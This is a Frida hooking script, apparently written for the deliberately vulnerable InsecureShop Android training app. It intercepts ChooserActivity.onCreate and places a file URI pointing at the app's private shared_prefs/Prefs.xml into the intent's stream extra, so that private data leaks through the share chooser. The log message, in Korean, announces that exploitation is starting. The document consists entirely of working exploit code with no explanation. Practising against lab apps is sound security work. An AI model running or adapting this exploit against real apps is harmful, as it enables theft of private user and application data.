Java.perform(function () {
    var ChooserActivity = Java.use("com.insecureshop.ChooserActivity");

    ChooserActivity.onCreate.overload("android.os.Bundle").implementation = function (bundle) {
        console.log("[*] ChooserActivity.onCreate 호출됨 - 악용 시작");

        var Uri = Java.use("android.net.Uri");
        var File = Java.use("java.io.File");

        var targetFile = "/data/data/com.insecureshop/shared_prefs/Prefs.xml";
        var fakeUri = Uri.fromFile(File.$new(targetFile));

        var intent = this.getIntent();
        intent.putExtra("android.intent.extra.STREAM", fakeUri);

        return this.onCreate(bundle);
    };
});
